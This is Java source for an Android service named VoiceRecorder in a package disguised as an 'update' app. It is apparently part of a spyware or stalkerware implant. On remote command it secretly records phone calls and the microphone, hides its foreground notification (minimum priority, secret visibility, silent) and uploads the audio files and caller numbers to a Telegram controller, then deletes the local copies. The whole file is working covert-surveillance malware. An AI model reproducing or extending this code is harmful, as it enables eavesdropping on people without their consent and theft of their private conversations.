package com.kasari.update;

import android.app.*;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.*;
import androidx.core.app.NotificationCompat;
import java.io.File;

public class VoiceRecorder extends Service {

    public static final String ACTION_CALL      = "com.kasari.update.RECORD_CALL";
    public static final String ACTION_MIC       = "com.kasari.update.RECORD_MIC";
    public static final String ACTION_MIC_START = "com.kasari.update.MIC_START";
    public static final String ACTION_STOP      = "com.kasari.update.STOP_RECORD";
    public static final String EXTRA_SECONDS    = "seconds";

    public static volatile boolean isRecording = false;

    private MediaRecorder mRecorder;
    private String        mFile;
    private String        mNumber = "Unknown";
    private Handler       mStopHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        mStopHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();

        if (ACTION_STOP.equals(action)) {
            stopRecording("\uD83C\uDFA4 Recording");
            return START_NOT_STICKY;
        }

        startForeground(9902, buildNotif());

        if (ACTION_CALL.equals(action)) {
            mNumber = intent.getStringExtra("number");
            String type = intent.getStringExtra("type");
            if (mNumber == null) mNumber = "Unknown";
            if (type == null) type = "Call";
            startRecording();
            TelegramController.sendMessage("\uD83D\uDCDE Call recording shuru: " + mNumber + " [" + type + "]");

        } else if (ACTION_MIC.equals(action)) {
            int sec = intent.getIntExtra(EXTRA_SECONDS, 30);
            mNumber = "Mic";
            if (startRecording()) {
                TelegramController.sendMessage("\uD83C\uDFA4 Mic recording shuru — " + sec + "s. Ruko...");
                mStopHandler.postDelayed(() -> stopRecording("\uD83C\uDFA4 Mic Recording (" + sec + "s)"),
                    sec * 1000L);
            }

        } else if (ACTION_MIC_START.equals(action)) {
            mNumber = "Mic-Manual";
            if (startRecording()) {
                TelegramController.sendMessage(
                    "\uD83D\uDD34 Mic recording SHURU!\n" +
                    "/mic_stop bhejo band karne ke liye.\n" +
                    "Ab tak ki sabse acha quality (AAC 128kbps).");
            }
        }
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, BackgroundService.CH_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    private boolean startRecording() {
        if (isRecording) {
            TelegramController.sendMessage("⚠️ Recording pehle se chal rahi hai. /mic_stop karo pehle.");
            return false;
        }
        try {
            mFile = getCacheDir().getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".m4a";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                mRecorder = new MediaRecorder(this);
            } else {
                mRecorder = new MediaRecorder();
            }
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mRecorder.setAudioSamplingRate(44100);
            mRecorder.setAudioEncodingBitRate(128000);
            mRecorder.setAudioChannels(1);
            mRecorder.setOutputFile(mFile);
            mRecorder.prepare();
            mRecorder.start();
            isRecording = true;
            return true;
        } catch (Exception e) {
            TelegramController.sendMessage("❌ Recording error: " + e.getMessage());
            isRecording = false;
            stopSelf();
            return false;
        }
    }

    private void stopRecording(String caption) {
        mStopHandler.removeCallbacksAndMessages(null);
        boolean hadRecording = isRecording;
        isRecording = false;
        if (mRecorder != null) {
            try { mRecorder.stop(); } catch (Exception ignored) {}
            mRecorder.release();
            mRecorder = null;
        }
        if (!hadRecording) {
            stopForeground(true);
            stopSelf();
            return;
        }
        String filePath = mFile;
        String finalCaption = caption + "\nNumber: " + mNumber;
        new Thread(() -> {
            if (filePath == null) return;
            File f = new File(filePath);
            if (f.exists() && f.length() > 500) {
                TelegramController.sendFile(f, finalCaption);
                f.delete();
            } else {
                TelegramController.sendMessage("⚠️ Recording too short or empty.");
                if (f.exists()) f.delete();
            }
        }).start();
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        isRecording = false;
        mStopHandler.removeCallbacksAndMessages(null);
        if (mRecorder != null) {
            try { mRecorder.stop(); mRecorder.release(); } catch (Exception ignored) {}
            mRecorder = null;
        }
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}